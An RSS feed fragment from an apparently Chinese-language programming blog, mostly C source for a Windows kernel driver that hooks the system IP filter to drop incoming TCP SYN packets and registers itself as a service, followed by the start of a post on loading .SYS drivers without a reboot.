/&gt;//建立一个过滤钩子驱动设备符号连接 &lt;br /&gt;status = IoCreateSymbolicLink( &amp;amp;win32DeviceName, &amp;amp;ntDeviceName ); &lt;br /&gt;if (!NT_SUCCESS(status)) // If we couldn't create the link then &lt;br /&gt;{ // abort installation. &lt;br /&gt;goto ERROR; &lt;br /&gt;} &lt;br /&gt;//申明卸载例程 &lt;br /&gt;DriverObject-&amp;gt;DriverUnload = DriverUnload; &lt;br /&gt;//建立钩子挂接 &lt;br /&gt;status = CreateFilterHook(DriverObject); &lt;br /&gt;if (!NT_SUCCESS(status)) // If we couldn't create the link then &lt;br /&gt;{ // abort installation. &lt;br /&gt;IoDeleteSymbolicLink(&amp;amp;win32DeviceName); &lt;br /&gt;goto ERROR; &lt;br /&gt;} &lt;br /&gt;return(STATUS_SUCCESS); &lt;br /&gt;ERROR: &lt;br /&gt;if(deviceObject) &lt;br /&gt;IoDeleteDevice(deviceObject); &lt;br /&gt;//DbgPrint( "Leave DriverEntry failed\n" ); &lt;br /&gt;return status; &lt;br /&gt;} &lt;br /&gt;&lt;br /&gt;NTSTATUS &lt;br /&gt;CreateFilterHook(IN PDRIVER_OBJECT DriverObject) &lt;br /&gt;{ &lt;br /&gt;PIRP nirp; &lt;br /&gt;NTSTATUS status = STATUS_SUCCESS; &lt;br /&gt;PFILE_OBJECT filtfileob; &lt;br /&gt;UNICODE_STRING ntDeviceName; &lt;br /&gt;PDEVICE_OBJECT filtdeviceob; &lt;br /&gt;PF_SET_EXTENSION_HOOK_INFO filthook; &lt;br /&gt;IO_STATUS_BLOCK filtstatus; &lt;br /&gt;&lt;br /&gt;RtlInitUnicodeString(&amp;amp;ntDeviceName,L"\\Device\\IPFILTERDRIVER"); &lt;br /&gt;//将钩子挂接函数放入结构中 &lt;br /&gt;filthook.ExtensionPointer = IpFilterHook; &lt;br /&gt;//获得系统ipfilterdriver驱动的设备指针 &lt;br /&gt;status = IoGetDeviceObjectPointer(&amp;amp;ntDeviceName,FILE_GENERIC_READ|FILE_GENERIC_WRITE,&amp;amp;filtfileob,&amp;amp;filtdeviceob); &lt;br /&gt;if(status!=STATUS_SUCCESS) &lt;br /&gt;return status; &lt;br /&gt;//绑定过滤钩子到系统ipfilterdriver驱动的设备指针 &lt;br /&gt;nirp = IoBuildDeviceIoControlRequest( &lt;br /&gt;IOCTL_PF_SET_EXTENSION_POINTER, &lt;br /&gt;filtdeviceob, &lt;br /&gt;&amp;amp;filthook, &lt;br /&gt;sizeof(PF_SET_EXTENSION_HOOK_INFO), &lt;br /&gt;NULL, &lt;br /&gt;0, &lt;br /&gt;FALSE, &lt;br /&gt;NULL, &lt;br /&gt;&amp;amp;filtstatus); &lt;br /&gt;if(nirp==NULL) &lt;br /&gt;return filtstatus.Status; &lt;br /&gt;//调度系统ipfilterdriver设备重新操作irp &lt;br /&gt;return (IoCallDriver(filtdeviceob,nirp)); &lt;br /&gt;} &lt;br /&gt;&lt;br /&gt;VOID &lt;br /&gt;DriverUnload(IN PDRIVER_OBJECT DriverObject) &lt;br /&gt;{ &lt;br /&gt;//与加载一样，只是钩子函数结构中放NULL，让系统ipfilterdriver卸载加载的钩子函数 &lt;br /&gt;&lt;br /&gt;PIRP nirp; &lt;br /&gt;NTSTATUS status = STATUS_SUCCESS; &lt;br /&gt;PDEVICE_OBJECT filtdeviceob; &lt;br /&gt;PFILE_OBJECT filtfileob; &lt;br /&gt;PF_SET_EXTENSION_HOOK_INFO filthook; &lt;br /&gt;IO_STATUS_BLOCK filtstatus; &lt;br /&gt;UNICODE_STRING ntDeviceName; &lt;br /&gt;&lt;br /&gt;RtlInitUnicodeString(&amp;amp;ntDeviceName,L"\\Device\\IPFILTERDRIVER"); &lt;br /&gt;filthook.ExtensionPointer = NULL; &lt;br /&gt;status = IoGetDeviceObjectPointer(&amp;amp;ntDeviceName,FILE_GENERIC_READ|FILE_GENERIC_WRITE,&amp;amp;filtfileob,&amp;amp;filtdeviceob); &lt;br /&gt;if(status==STATUS_SUCCESS) &lt;br /&gt;{ &lt;br /&gt;nirp = IoBuildDeviceIoControlRequest( &lt;br /&gt;IOCTL_PF_SET_EXTENSION_POINTER, &lt;br /&gt;filtdeviceob, &lt;br /&gt;&amp;amp;filthook, &lt;br /&gt;sizeof(PF_SET_EXTENSION_HOOK_INFO), &lt;br /&gt;NULL, &lt;br /&gt;0, &lt;br /&gt;FALSE, &lt;br /&gt;NULL, &lt;br /&gt;&amp;amp;filtstatus); &lt;br /&gt;if(nirp!=NULL) &lt;br /&gt;IoCallDriver(filtdeviceob,nirp); &lt;br /&gt;} &lt;br /&gt;IoDeleteSymbolicLink(&amp;amp;win32DeviceName); &lt;br /&gt;IoDeleteDevice(deviceObject); &lt;br /&gt;return; &lt;br /&gt;} &lt;br /&gt;&lt;br /&gt;PF_FORWARD_ACTION &lt;br /&gt;IpFilterHook( &lt;br /&gt;unsigned char *PacketHeader, &lt;br /&gt;unsigned char *Packet, &lt;br /&gt;unsigned int PacketLength, &lt;br /&gt;unsigned int RecvInterfaceIndex, &lt;br /&gt;unsigned int SendInterfaceIndex, &lt;br /&gt;IPAddr RecvLinkNextHop, &lt;br /&gt;IPAddr SendLinkNextHop &lt;br /&gt;) &lt;br /&gt;{ &lt;br /&gt;//过滤钩子函数，这儿只简单判断属于TCP协议且数据是抵达而且带SYN标志则过滤。大家可以根据需要修改自己的过滤判断和处理。 &lt;br /&gt;if(((IPHeader *)PacketHeader)-&amp;gt;iph_protocol == PROT_TCP) &lt;br /&gt;{ &lt;br /&gt;//Packet[13]==0x2就是TCP中SYN的标志 &lt;br /&gt;//SendInterfaceIndex==INVALID_PF_IF_INDEX说明包是抵达而不是发送的，因此这样过滤就不会影响自己的包出去，但是外来带SYN请求的包则会拒绝。 &lt;br /&gt;if(Packet[13]==0x2 &amp;amp;&amp;amp; SendInterfaceIndex==INVALID_PF_IF_INDEX) &lt;br /&gt;return PF_DROP; &lt;br /&gt;} &lt;br /&gt;return PF_FORWARD; &lt;br /&gt;} &lt;br /&gt;&lt;br /&gt;//简单的建立注册表项的程序 &lt;br /&gt;&lt;br /&gt;unsigned char sysdir[256]; &lt;br /&gt;unsigned char drivcedir[256]; &lt;br /&gt;int RegHandelDev(char * exename) &lt;br /&gt;{ &lt;br /&gt;//修改注册表启动一个NTHANDLE驱动程序 &lt;br /&gt;char subkey[200]; &lt;br /&gt;int buflen; &lt;br /&gt;HKEY hkResult; &lt;br /&gt;char Data[4]; &lt;br /&gt;DWORD isok; &lt;br /&gt;buflen = sprintf(subkey,"System\\CurrentControlSet\\Services\\%s",exename); &lt;br /&gt;subkey[buflen]=0; &lt;br /&gt;isok = RegCreateKey(HKEY_LOCAL_MACHINE,subkey,&amp;amp;hkResult); &lt;br /&gt;if(isok!=ERROR_SUCCESS) &lt;br /&gt;return FALSE; &lt;br /&gt;Data[0]=3; &lt;br /&gt;Data[1]=0; &lt;br /&gt;Data[2]=0; &lt;br /&gt;Data[3]=0; &lt;br /&gt;isok=RegSetvalueEx(hkResult,"Start",0,4,(const unsigned char *)Data,4); &lt;br /&gt;Data[0]=1; &lt;br /&gt;isok=RegSetvalueEx(hkResult,"Type",0,4,(const unsigned char *)Data,4); &lt;br /&gt;isok=RegSetvalueEx(hkResult,"ErrorControl",0,4,(const unsigned char *)Data,4); &lt;br /&gt;GetSystemDirectory(sysdir,256); &lt;br /&gt;buflen = sprintf(drivcedir,"%s\\Drivers\\F *** iltHook.sys",sysdir); &lt;br /&gt;buflen = sprintf(subkey,"\\??\\%s",drivcedir); &lt;br /&gt;subkey[buflen]=0; &lt;br /&gt;isok=RegSetvalueEx(hkResult,"ImagePath",0,1,(const unsigned char *)subkey,buflen); &lt;br /&gt;RegCloseKey(hkResult); &lt;br /&gt;buflen = sprintf(subkey,"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s",exename); &lt;br /&gt;subkey[buflen]=0; &lt;br /&gt;return TRUE; &lt;br /&gt;} &lt;br /&gt;&lt;br /&gt;int main(int argc,char *argv[]) &lt;br /&gt;{ &lt;br /&gt;//注册驱动程序 &lt;br /&gt;if(RegHandelDev("F *** ilthook")==FALSE) &lt;br /&gt;return FALSE; &lt;br /&gt;return TRUE; &lt;br /&gt;} &lt;/span&gt;&lt;/p&gt;</description></item><item><title>如何不重启系统加载.SYS文件</title><link>https://blogs.qipai360.cn/post/load-sys-file-without-reboot/</link><pubDate>Sun, 10 Oct 2004 19:33:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/load-sys-file-without-reboot/</guid><description>&lt;p&gt;&lt;FONT face=宋体 size=2&gt;首先，SYS的加载控制是在注册表里，START控制，你肯定已经知道了，我
就不多说了。
可以用控制面版DEVICE，这个你已经知道了，还可以用NET START XXX
和NET STOP XXX来启动和加载，这个你肯定也知道了。&lt;/p&gt;</description></item></channel></rss>